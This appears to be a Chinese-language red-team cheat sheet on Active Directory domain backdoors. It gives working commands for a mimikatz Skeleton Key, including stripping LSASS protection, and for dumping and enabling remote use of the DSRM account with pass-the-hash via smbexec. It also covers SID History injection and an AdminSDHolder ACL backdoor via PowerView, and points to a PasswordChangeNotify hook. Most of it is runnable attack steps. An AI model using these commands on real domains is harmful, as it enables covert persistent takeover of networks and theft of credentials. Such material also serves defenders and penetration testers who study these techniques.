# 域后门

#### Skeleton key后门

* 通过在域控制器上安装万能钥匙，所有的域用户账户都可以使用一个相同的密码进行认证，同时原有密码仍然有效

在域控制器上利用mimikatz安装万能钥匙

```
mimikatz.exe "privilege::debug" "misc::skeleton" exit
```

2014年微软添加了LSA(本地安全机构)保护策略用来防止对Isass进程的内存读取和代码注入，可以开启和关闭LSa保护 开启LSA保护策略

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
```

关闭LSA保护策略

```
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL 
```

mimikatz绕LSA安装Skeleton(需要mimikatz项目中存在mimidrv.sys)，成功利用后可使用密码mimikatz远程连接

```
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
```

#### DSRM域后门

**关于DSRM**

* 目录服务还原模式，是域控制器的安全模式启动选择，用于服务器脱机，以进行紧急维护
* 初期安装DC时会要求设置DSRM的管理员密码

通过DC上运行NTDSUtil，可以为DSRM账户修改密码

```
ntdsutil
set dsrm password
reset password on server null
<设置密码>
<确认密码>
q
q
```

**mimikatz读取DSRM账户实现DSRM远程登录**

mimikatz读取hash,RID:000001f4(500)

```
mimikatz.exe "privilege==debug" "token==elevate" "lsadump::sam" exit
```

修改DSRM账户登录模式，以允许远程登录，可以通过修改注册表DsrmAdminLogonBehavior键值实现，其中0为默认值，只有当域控制器重启进入DSRM模式时，才能使用DSRM账号，1为本地AD、DS服务停止时才可以使用DSRM管理员账户登录，2为任何时候，都可以使用

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
```

利用hash传递获取交互

```
python3 smbexec.py -hashes :a8f33bee89eba84d289ab51248f1534b Administrator@192.168.0.104
```

#### SID History

**关于SID**

* Windows系统中SID是指安全标识符，为用户、用户组、其他安全主体唯一不可变标识符
* ACL使用SID来唯一标识用户及其组成员身份，授予或拒绝对资源的访问和特权
* 当用户请求访问资源时，会生成访问令牌，其中包含用户和组SID和用户权限级别
* SID History是一个支持域迁移方案的属性，使得一个账户的访问权限可以有效地克隆到另外一个账户

**SID History利用**

\-测试人员可以将域管理员用户的SID添加到其它域用户的SID History属性，以此建立一个隐蔽的域后门

在DC上，mimikatz > 2.1.0

```
mimikatz.exe "privilege::debug" "sid::patch" "sid:add /sam:lbwnb /new:Administrator" exit
```

在DC上，mimikatz < 2.1.0

```
mimikatz.exe "privilege::debug" "misc:addsid Hacker ADSAdministrator" exit
```

#### AdminSDHolder域后门

**关于AdminSDHolder**

* 是一个特殊的Active Directory容器对象，位于Domain NC的System容器下
* AdminSDHolder通常作为系统中某些受保护对象的安全模板
* 受保护对象通常包括系统的特权用户和组，如administrator、Domain Admins、Enterprise Admins等
* 在活动目录中，属性adminCount用来标记特权用户和组，该属性值被设置为1
* 默认情况下系统定期(60分钟)检查受保护对象的安全描述符，将受保护对象的ACL与AdminSDHolder容器的ACL容器进行比较，如果不一致将会将保护对象的ACL强制改为AdminSDHolder容器的ACL，该工作通过SDProp进程来完成。

枚举受保护用户

```
Adfind.exe -b "dc=hack-my,dc=com" -f "&(objectcategory=person)(samaccountname=*)(admincount=1)" -dn
```

枚举受保护组

```
Adfind.exe -b "dc=hack-my,dc=com" -f "&(objectcategory=group)(samaccountname=*)(admincount=1)" -dn
```

**AdminSDHolder利用**

* 通过篡改AdminSDHolder容器的ACL配置，当系统调用SDProp进程执行相关工作时，被篡改的ACL配置将同步到受保护对象的ACL中，以此建立一个后门

使用PowerView.ps1脚本向AdminSDHolder容器对象添加一个ACL，使普通用户lbwnb拥有对AdminSDHolder的完全控制权限

```
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetsearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=hack-my,DC=com" -PrincipalIdent lbwnb -Rights All -Verbose
```

清除复原

```
Import-Module .\PowerView.ps1
Remove-DomainObjectAcl -TargetsearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=hack-my,DC=com" -PrincipalIdent lbwnb -Rights All -Verbose
```

#### HOOK PasswordChangeNotify

**关于PasswordChangeNotify**

* 官方文档名称为PsamPasswordNotificationRoutine，为Windows APi
* 当用户重置密码时，Windows会先检查密码是否符合复杂性要求，如果密码符合要求，LSA会调用PAsswordChangeNotify函数在系统中同步密码

```
PSAM_PASSWORD_NOTIFICATION_ROUTINE PsamPasswordNotificationRoutine;

NTSTATUS PsamPasswordNotificationRoutine(
  [in] PUNICODE_STRING UserName,
  [in] ULONG RelativeId,
  [in] PUNICODE_STRING NewPassword
)
{...}
```

**HOOK劫持PasswordChangeNotify函数**

https://github.com/3gstudent/Hook-PasswordChangeNotify
